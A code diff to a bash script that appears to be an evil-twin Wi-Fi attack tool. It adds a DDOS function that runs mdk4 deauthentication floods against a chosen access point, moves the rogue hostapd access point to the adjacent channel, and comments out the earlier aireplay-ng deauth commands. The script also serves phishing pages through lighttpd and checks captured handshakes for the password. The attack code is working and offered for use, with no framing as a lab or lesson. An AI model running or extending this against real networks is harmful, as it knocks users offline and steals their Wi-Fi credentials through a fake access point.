@@ -97,13 +97,22 @@ echo $BLU
 read -p  "Select the interface ==> " interface 
 
 interf=`awk '{if(NR==interface) print $1}' interface=$interface info/interface.txt`
+
 sudo airmon-ng check kill  > /dev/null 2>&1 
 sudo airmon-ng start $interf  > /dev/null 2>&1 
 sudo systemctl start NetworkManager
 echo  "══════════════════════════════════════════════════"
 echo $GRN 'Convert to monitot mode success....'
 echo  $BLU"══════════════════════════════════════════════════"
-
+while read -r lined
+do 
+if [[ $lined != $interf ]]
+then 
+echo $lined >> info/ddos_interface.txt
+else
+continue
+fi
+done < info/interface.txt 
 clear
 fi 
 } 
@@ -136,7 +145,7 @@ sudo awk -F "\"*,\"*" '{print $1 , $6}' info/$name-01.csv > info/cliens.txt
 
 cat  -n info/cliens.txt > info/cliens2.txt
 
-numline=1
+
 while read -r linec
 do 
 
@@ -189,11 +198,11 @@ CHANNEL=`awk -F"|" '{if(NR==n) print $2}' n=$n info/wifi_csv.txt `
 BSSID=`awk -F"|" '{if(NR==n)  print $3}'  n=$n info/wifi_csv.txt `
 ESSID=`awk -F"|" '{if(NR==n)  print $1}' n=$n  info/wifi_csv.txt `
 CLIENTS=`cat info/cliens3.txt | grep -e "$BSSID" | wc -l`
-
+CHANNEL2=$((CHANNEL+1))
 
 
 echo $n')'  $BSSID"      "$CHANNEL"          "$CLIENTS"            "$ESSID
-echo $BLU "-------------------------------------------------------------------"
+echo $BLU "------------------------------------------------------------------"
 
 n=$(($n+1))
 
@@ -349,6 +358,50 @@ sudo mv air.txt /tmp/$page
 
 }
 
+DDOS(){
+  clear
+  echo $RED
+  cat evil.txt
+  echo $BLU
+  read -p "do you want activate DDOS Attack [N/y]? " ddos_on
+
+  case $ddos_on in 
+  n|N)
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf"mon" d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
+  sleep 5
+
+  ;;
+  y)
+  clear
+  echo $RED
+  cat evil.txt
+  echo $BLU
+  echo ""
+  echo "select ddos attack interface ..! "
+  echo ""
+  ddosinterface=`cat info/ddos_interface.txt`
+  select dinterface in $ddosinterface
+  do
+  dinterface2=$dinterface
+  break
+  done
+  sudo airmon-ng start $dinterface2 > /dev/null 2>&1
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $dinterface2 d -c $CHANNEL -B $BSSID & > /dev/null 2>&1
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $dinterface2"mon" d -c $CHANNEL -B $BSSID & > /dev/null 2>&1
+
+  ;;
+  *)
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
+  sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf"mon" d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
+  sleep 5
+  ;;
+  esac
+
+
+
+}
+
 LIGHTTPD(){
 
     echo "
@@ -461,7 +514,7 @@ echo "interface=mon0
 driver=nl80211
 ssid=$WESSID
 hw_mode=g
-channel=$CHANNEL
+channel=$CHANNEL2
 macaddr_acl=0
 ignore_broadcast_ssid=0
 
@@ -481,8 +534,10 @@ sudo xterm -geometry 100x30-0-0  -hold -e hostapd info/hostapd.conf  &
 
  
 
-sudo xterm -fg red -geometry 100x30-0+0 -e aireplay-ng -0 0 -R --ignore-negative-one -a $BSSID  $interf"mon" &
-sudo xterm -fg red -geometry 100x30-0+0 -e aireplay-ng -0 0 -R --ignore-negative-one -a $BSSID  $interf &
+# sudo xterm -fg red -geometry 100x30-0+0 -e aireplay-ng -0 0 -R --ignore-negative-one -a $BSSID  $interf"mon" &
+# sudo xterm -fg red -geometry 100x30-0+0 -e aireplay-ng -0 0 -R --ignore-negative-one -a $BSSID  $interf &
+
+
 
 }
 
@@ -583,7 +638,9 @@ trap 'sigint_handler' SIGINT
 
 ##################crack##################
 CRACK(){
-clear 
+ clear
+  echo $RED
+  cat evil.txt
 echo $GRN
 sleep 1
 echo "Starting Attack ........."
@@ -620,6 +677,7 @@ SELECT
 CHECK_HANDSHAKE
 CHECK_PASS
 SELECT_PAGES
+DDOS 
 LIGHTTPD & 
 HOTSPOT &
 REDIR &
